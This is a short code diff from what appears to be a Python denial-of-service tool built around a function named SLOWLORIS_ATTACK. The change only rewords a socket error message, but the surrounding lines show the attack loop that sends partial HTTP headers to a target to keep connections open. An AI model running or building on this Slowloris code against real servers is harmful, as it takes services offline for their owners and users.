@@ -59,7 +59,7 @@ def SLOWLORIS_ATTACK(threads, attack_time, target):
 				try:
 					sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
 				except socket.error:
-					print("\033[1;31m"+"[-]"+"\033[0m"+" Failed!")
+					print("\033[1;31m"+"[-]"+"\033[0m"+" Failed to build socket!")
 				else:
 					print("\033[1;34m"+"[*]"+"\033[0m"+" Sending to " + target + "...")
 
